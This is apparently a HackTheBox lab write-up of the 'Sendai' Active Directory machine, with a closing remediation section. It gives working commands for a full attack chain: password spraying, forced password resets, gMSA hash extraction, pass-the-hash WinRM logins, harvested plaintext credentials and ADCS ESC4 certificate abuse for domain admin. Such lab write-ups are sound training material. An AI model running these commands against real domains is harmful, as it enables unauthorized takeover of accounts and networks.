# HackTheBox - Sendai Writeup

**Machine:** Sendai  
**IP Address:** 10.129.234.66  
**Difficulty:** Medium
**OS:** Windows (Active Directory)

---

## Table of Contents

- [Reconnaissance](#reconnaissance)
- [Initial Access](#initial-access)
- [Privilege Escalation - User](#privilege-escalation---user)
- [Privilege Escalation - Root](#privilege-escalation---root)
- [Key Takeaways](#key-takeaways)
- [Tools Used](#tools-used)
- [Flags](#flags)
- [Remediation Recommendations](#remediation-recommendations)

---

## Reconnaissance

### Target Details

- Domain/Host: `DC.sendai.vl`, `sendai.vl`

### SMB Guest Enumeration

```bash
nxc smb 10.129.234.66 --generate-hosts-file /etc/hosts
nxc smb dc.sendai.vl -u 'guest' -p ''

smbmap -H dc.sendai.vl -d 'sendai.vl' -u 'guest' -p ''
```

Shares of interest:

- `sendai`
- `Users`

Downloaded `incident.txt` from `sendai`:

```bash
smbclient //10.129.234.66/sendai -N
get incident.txt
```

RID brute force to enumerate users:

```bash
nxc smb dc.sendai.vl -u guest -p '' --rid-brute | grep SidTypeUser | cut -d'\' -f2 | cut -d' ' -f1 > users.txt
```

---

## Initial Access

### Password Spray and Reset

Password spray with empty password:

```bash
nxc smb DC.sendai.vl -u users.txt -p '' --continue-on-success
```

Found:

- `Elliot.Yates` and `Thomas.Powell` returned `STATUS_PASSWORD_MUST_CHANGE`.

Reset password for `Thomas.Powell`:

```bash
nxc smb DC.sendai.vl -u Thomas.Powell -p '' -M change-password -o NEWPASS='pa$$w0rd'
```

### BloodHound

```bash
bloodhound-python -u 'Thomas.Powell' -p 'pa$$w0rd' -d 'sendai.vl' -c All -ns 10.129.234.66 --dns-tcp --zip
```

Key findings:

- `Thomas.Powell` ∈ `Support`.
- `Support` has `GenericAll` on `admsvc`.
- `admsvc` has `ReadGMSAPassword` over `MGTSVC$`.
- `MGTSVC$` is in the Remote Management group.

### GMSA Hash and WinRM

Added Thomas to `admsvc` and dumped gMSA password:

```bash
bloodyAD -u 'Thomas.Powell' -p 'pa$$w0rd' -d 'sendai.vl' --host 'DC.sendai.vl' add groupMember "admsvc" 'Thomas.Powell'

nxc ldap DC.sendai.vl -u 'Thomas.Powell' -p 'pa$$w0rd' --gmsa
```

Obtained NTLM hash for `MGTSVC$`:

- `9ed35c68b88f35007aa32c14c1332ce7`

Connected via WinRM:

```bash
evil-winrm -i DC.sendai.vl -u 'sendai.vl\mgtsvc$' -H '9ed35c68b88f35007aa32c14c1332ce7'
```

User flag:

```cmd
type C:\user.txt
```

---

## Privilege Escalation - User

### Credential Discovery in Service Registry

Enumerated services and registry:

```powershell
Get-Process
Get-ChildItem -Path HKLM:\SYSTEM\CurrentControlSet\services | Get-ItemProperty | Select-Object ImagePath | Select-String helpdesk
```

Found plaintext credentials for:

- `clifford.davey / RFmoB2WplgE_3p`

Validated SMB:

```bash
nxc smb DC.sendai.vl -u clifford.davey -p RFmoB2WplgE_3p
```

User is in `CA-Operators`, indicating ADCS escalation potential.

---

## Privilege Escalation - Root

### ADCS ESC4 (SendaiComputer Template)

Enumerated vulnerable templates:

```bash
certipy-ad find -u 'Clifford.Davey'@'sendai.vl' -p 'RFmoB2WplgE_3p' -dc-ip 10.129.234.66 -vulnerable -enabled
```

Template `SendaiComputer` is vulnerable (ESC4). Retrieved Administrator SID:

```bash
ldapsearch -H ldap://10.129.234.66 -D 'clifford.davey@sendai.vl' -w 'RFmoB2WplgE_3p' -b "DC=sendai,DC=vl" "(sAMAccountName=Administrator)" objectSid | grep 'objectSid::' | cut -d' ' -f2 | base64 -d | python3 -c 'import sys;d=sys.stdin.buffer.read();sid="S-"+str(d[0])+"-"+str(int.from_bytes(d[2:8],"little"));sid+="-"+"-".join(str(int.from_bytes(d[i:i+4],"little")) for i in range(8,len(d),4));print(sid)'
```

Modified template, requested certificate, then restored template:

```bash
source '/usr/local/bin/certipy42-env/bin/activate'

certipy template -u 'clifford.davey' -p 'RFmoB2WplgE_3p' -template SendaiComputer -dc-ip 10.129.234.66 -save-old

certipy req -u 'clifford.davey' -p 'RFmoB2WplgE_3p' -ca sendai-DC-CA -template SendaiComputer -upn administrator@sendai.vl -sid S-1-5-21-3085872742-570972823-736764132-500 -dc-ip 10.129.234.66

certipy template -u 'clifford.davey' -p 'RFmoB2WplgE_3p' -template SendaiComputer -dc-ip 10.129.234.66 -configuration SendaiComputer.json
```

Authenticated as Administrator:

```bash
certipy auth -pfx administrator.pfx -dc-ip 10.129.234.66
```

WinRM with Administrator hash:

```bash
evil-winrm -i DC.sendai.vl -u 'sendai.vl\administrator' -H 'cfb106feec8b89a3d98e14dcbe8d087a'
```

Root flag:

```cmd
type C:\Users\Administrator\Desktop\root.txt
```

---

## Key Takeaways

1. SMB guest access enabled user enumeration via RID brute force.
2. Blank password spray exposed accounts with forced password change.
3. GMSA read rights led to WinRM access as MGTSVC$.
4. Service registry values leaked plaintext credentials.
5. CA-Operators with ESC4 permissions enabled certificate-based DA compromise.

---

## Tools Used

- nxc
- smbclient / smbmap
- bloodhound-python
- bloodyAD
- evil-winrm
- certipy-ad
- ldapsearch

---

## Flags

**User Flag:** `C:\user.txt` (value not recorded in PDF)  
**Root Flag:** `C:\Users\Administrator\Desktop\root.txt` (value not recorded in PDF)

---

## Remediation Recommendations

### Critical Severity

1. **Disable SMB Guest Access**

   - **Issue:** Guest access enabled enumeration and file access.
   - **Impact:** User discovery and initial foothold.
   - **Remediation:**
     - Disable guest SMB and require authenticated access.

2. **Fix ADCS Template Permissions (ESC4)**

   - **Issue:** `SendaiComputer` template granted dangerous rights to CA-Operators.
   - **Impact:** Certificate-based domain admin compromise.
   - **Remediation:**
     - Audit certificate templates and remove excessive permissions.
     - Restrict CA-Operators group membership.

### High Severity

3. **Eliminate Plaintext Service Credentials**

   - **Issue:** Service registry stored credentials in plaintext.
   - **Impact:** Lateral movement to CA-Operators.
   - **Remediation:**
     - Use managed service accounts and secrets management.

4. **Reduce GMSA Read Rights**

   - **Issue:** `admsvc` could read MGTSVC$ password.
   - **Impact:** WinRM access to DC.
   - **Remediation:**
     - Limit gMSA access to only required principals.

### Medium Severity

5. **Harden Password Policies**

   - **Issue:** Blank password spray revealed expired accounts.
   - **Impact:** Unauthorized password resets.
   - **Remediation:**
     - Enforce strong passwords and lockout policies.
